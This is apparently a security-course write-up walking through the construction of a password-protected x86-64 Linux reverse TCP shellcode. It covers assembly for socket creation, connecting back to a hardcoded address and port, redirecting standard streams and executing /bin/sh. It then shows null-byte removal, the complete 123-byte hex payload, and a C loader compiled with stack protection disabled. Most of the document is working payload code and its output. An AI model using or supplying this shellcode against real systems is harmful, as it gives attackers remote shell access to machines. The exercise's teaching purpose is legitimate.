## Shell_Reverse_TCP
---
---
### Introduction
---
Requirement is to create a Shell_Bind_TCP shellcode that: 

- Conects back to a IP and PORT 
- Requires a password 
- If the password is correct, then Exec Shell is executed 
- NULL bytes (`0x00`) must be removed from the shellcode 

To build the shellcode, linux sockets are required to implement the following steps: 

1. Create a socket 
2. Reverse connect 
3. Ask, read, and validate the password 
4. Duplicate SDTIN, STDOUT and STDERR to the socket 
5. Execute /bin/sh  

As in the previous assignment, the program will exit with a Segmentation Fault if the password is incorrect.

For Linux Sockets Programming, the following System calls are required on this assignment:
```c
int socket(int domain, int type, int protocol); 
int connect(sock, (struct sockaddr *)&server, sockaddr_len);
int close(int sockfd); 
```
To duplicate the standard input, output and error, `sys_dup2` call will be used:

```c
int dup2(int oldfd, int newfd); 
```
And to execute `/bin/sh`, will use `sys_execve`:
```c
int execve(const char *filename, char *const argv[],  char *const envp[]);
```
### ASM Implementation
---

Will explain how we implement each step mentioned before into ASM code, with the idea to make the code easy to understand. As in the previous assignment, no enphasys has been put into removing NULLs and make the shellcode small (this is done later). This time, implementation will be easier than the previous assignment as the number of syscalls is reduced for being a reverse shell.

#### Create Socket
```asm
; sock = socket(AF_INET, SOCK_STREAM, 0) 
mov rax, 41                     ; syscall number 
mov rdi, AF_INET                ; IPv4 
mov rsi, SOCK_STREAM            ; TCP connection 
mov rdx, 0                      ; IP Protocol 
syscall 

; Save the socket_id value in RDI for future use 
mov rdi, rax                    ; value returned in RAX by syscall 
```
Opens the socket. To execute the `sys_socket` call, the arguments will have to be placed in the corresponding registers: 

  - **RAX** <- 41 : Syscall number. 
  - **RDI** <- 2  : Domain parameter. AF_INET is for IPv4. 
  - **RSI** <- 1  : Type parameter. SOCK_STREAM means connection oriented TCP. 
  - **RDX** <- 0  : Protocol. IPPROTO_IP means it’s an IP protocol 

The syscall will return a file descriptor in **RAX**, that is saved into **RDI**. This saves the socket descriptor for later use in the code.

#### Connect Back
The following call is the one being to be used: 
```c
int  connect(int  sockfd, const struct sockaddr *serv_addr, socklen_t addrlen); 
```
For this assignment, registers will get the following values: 

- **RDI** : The sock descriptor id from `sys_open` 
- **RSI** : Addres of the `sockaddr` struct 
- **RDX** : Length of the struct 

First is to build the struct with the required data. This is done using the stack in the following code: 

```asm
; Prepare the struct for connect 
;     server.sin_family = AF_INET 
;     server.sin_port = htons(PORT) 
;     server.sin_addr.s_addr = inet_addr("127.0.0.1") 
;     bzero(&server.sin_zero, 8) 

xor rax, rax 
push rax                                ; bzero 

mov dword [rsp-4], 0x0100007f           ; Inet addr == 127.0.0.1 
mov word [rsp-6], 0x5c11                ; Port 4444 
mov word [rsp-8], 0x2                   ; TCP Connection 
sub rsp, 8                              ; Update RSP value 
```
The legth of this struct is a total of 16 bytes, and the address to the struct is in **RSP**. 

Next step is do the call to `sys_connect`, placing **RSP** into **RSI** to point to the `sockaddr` struct, **RDI** already will have the socket descriptor id from before, and **RDX** the value "16" that's the length of the struct: 
```asm
; connect(sock, (struct sockaddr *)&server, sockaddr_len) 

mov rax, 42                             ; Syscall number for connect() 
mov rsi, rsp                            ; & struct 
mov rdx, 16                             ; Struct length 
syscall 
```
#### Duplicate to Socket Descriptor
Now is time to duplicate `stdin`, `stdout` and `stderr` to the socket descriptor. This is done in the following code, pretty much the same as the previous assignment: 
```asm
        ; duplicate sockets 
        ; dup2 (new, old) 

        mov rax, 33 
        mov rsi, 0 
        syscall 

        mov rax, 33 
        mov rsi, 1 
        syscall 

        mov rax, 33 
        mov rsi, 2 
        syscall 
 ```
#### Password Stuff
The code for the password stuff is the same as in the [Assignment #1](Assignment01). A `“Passwd: “` prompt is shown, and a password max of 8 characters is received from the user input. This input is compared to the hardcoded password, and if equals the program continues, else, the program exits with a segmentation fault.
```asm
write_syscall: 

        mov rax, 1                              ; Syscall number for write() 
        mov rdi, r9 
        lea rsi, [rel PASSWD_PROMPT]            ; Rel addressing to prompt 
        mov rdx, 8                              ; Length of PAsswd: string 
        syscall 

read_syscall: 

        xor rax, rax                            ; Syscall number for read() 
        mov rdi, r9 
        mov rsi, [rel PASSWD_INPUT]             ; Where to store the input passwd 
        mov rdx, 8                              ; Chars to read 
        syscall 

compare_passwords: 

        mov rax, "12345678"                     ; Thgis is the password 
        lea rdi, [rel PASSWD_INPUT]             ; Compare the QWord 
        scasq 
        jne exit_program                        ; Passwords don't match, exit 
```
#### The Shell with Execve

Last step is to execute `/bin/sh`. Stack technique is used to store the string `/bin//sh` and the length of the string: 
```asm
execve_syscall: 

        ; First NULL push 
        xor rax, rax 
        push rax 

        ; push /bin//sh in reverse 
        mov rbx, 0x68732f2f6e69622f 
        push rbx 

        ; store /bin//sh address in RDI 
        mov rdi, rsp 

        ; Second NULL push 
        push rax 

        ; set RDX 
        mov rdx, rsp 

        ; Push address of /bin//sh 
        push rdi 

        ; set RSI 
        mov rsi, rsp 

        ; Call the Execve syscall 
        add rax, 59 
        syscall 
```

#### Putting All Together

The code for this first version of the Reverse Shell, can be found in the [ReverseShell-ExecveStack](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack.nasm) on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment02).

Let's try the code compiling and linking it. Commands are:

```bash
SLAE64> nasm -f elf64 ReverseShell-ExecveStack.nasm -o ReverseShell-ExecveStack.o
SLAE64> ld -N ReverseShell-ExecveStack.o -o ReverseShell-ExecveStack
```
<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Compile.png" width="75%" height="75%">

> The **-N** option in the linker is needed, as the code access to memory positions in the `.text` section (code) instead `.data` section during the execution.

To test, a `netcat` listener needs to be opened. Now the program can be run, and in the `netcat` listener, will get the `"Passwd: "` prompt:

<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Exec01.png" width="75%" height="75%">

Like in the previous assignment, if the password is correct, the program continues. If password is incorrect, the program ends with a segmentation fault.

### Remove NULLs and Reduce Shellcode Size
---
> The final ASM code after the changes explained in this section, can be found at the [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment02).

The actual shellcode has several NULLs and a size of 223 bytes. With `objdump`, opcodes for the instructions are shown and can review the NULLs in the shellcode:

```bash
SLAE64> objdump -M intel -d ReverseShell-ExecveStack.o
ReverseShell-ExecveStack.o:     formato del fichero elf64-x86-64
Desensamblado de la sección .text:

0000000000000000 <_start>:
   0:	eb 10                	jmp    12 <real_start>

0000000000000012 <real_start>:
  12:	b8 29 00 00 00       	mov    eax,0x29
  17:	bf 02 00 00 00       	mov    edi,0x2
  1c:	be 01 00 00 00       	mov    esi,0x1
  21:	ba 00 00 00 00       	mov    edx,0x0
  26:	0f 05                	syscall 
  28:	48 89 c7             	mov    rdi,rax
  2b:	48 31 c0             	xor    rax,rax
  2e:	50                   	push   rax
```
`objdump` shows instructions that use NULLs. First step, is removing the NULLs replacing instructions by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:

- `mov rax, VALUE` is replaced by `push VALUE; pop rax`
- `mov [rsp], VALUE` is replaced by `push VALUE`

By checking with `objdump` that the NULLs have been removed, next step is to reduce the shellcode size. Some tricks are:
- Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
- Using `cdq` instruction to ZEROing **RDX**. It puts **RDX** to `0x00` if **RAX** >= 0
- Replace `mov` instructions by `push;pop`

But still the shellcode size can be reduced, and can use more sophisticated techniques to even reduce it more. Original code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction, with a opcode that uses 7 bytes. For this, the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. Just like did in previous assignment.

With all the job done, the shellcode is generated with the one liner command for `objdump`:
```bash
SLAE64>echo “\"$(objdump -d ReverseShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
              cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""" 
              
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68
\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f
\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54
\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35
\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f
\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05"

SLAE64> 
```
<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Shellcode01.png" width="75%" height="75%">

This shellcode could be more reduced, removing the stuff to print the `"Passwd: "` prompt. `sys_close` haven't been used in this assignment. But with the reduction to **123 bytes** is good enought.

### Executing Final Shellcode
---
To test the shellcode, the `shellcode.c` template is used:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
To use it, the generated shellcode has to be placed in the `unsigned char code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68"
"\x11\x5c\x66\x6a\x02\x6a\x2a\x58\x54\x5e\x6a\x10\x5a\x0f\x05\x6a\x02\x5e\x6a\x21\x58\x0f"
"\x05\x48\xff\xce\x79\xf6\x6a\x01\x58\x49\xb9\x50\x61\x73\x73\x77\x64\x3a\x20\x41\x51\x54"
"\x5e\x6a\x08\x5a\x0f\x05\x48\x31\xc0\x48\x83\xc6\x08\x0f\x05\x48\xb8\x31\x32\x33\x34\x35"
"\x36\x37\x38\x56\x5f\x48\xaf\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
"\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now the code can be compiled with `gcc`, using the `-fno-stack-protector` and `-z execstack` options:
```bash
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```
The shellcode can be executed. A `netcat` listener is opened in one terminal, while in another terminal, `./shellcode` is run. Everything works as expected, as per the screenshot:

<img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_V2_Result01.png" width="75%" height="75%">

### GitHub Repo Files ena ExploitDB Submission
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment02) for this assignment contains the following files:

- [ReverseShell-ExecveStack.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack.nasm) : This is the ASM source code for the first version of the code. It's with NULLs and not caring on the shellcode size, but is more clear to understand the code.
- [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack_V2.nasm) : This is the NULL free code with the shellcode size reduced.
- [shellcode.c](https://github.com/galminyana/SLAE64/blob/main/Assignment02/shellcode.c) : The C template with the V2 of the shellcode to run and execute

This shellcode has been published at [Exploit-DB](https://www.exploit-db.com/), at [https://www.exploit-db.com/shellcodes/49442](https://www.exploit-db.com/shellcodes/49442)

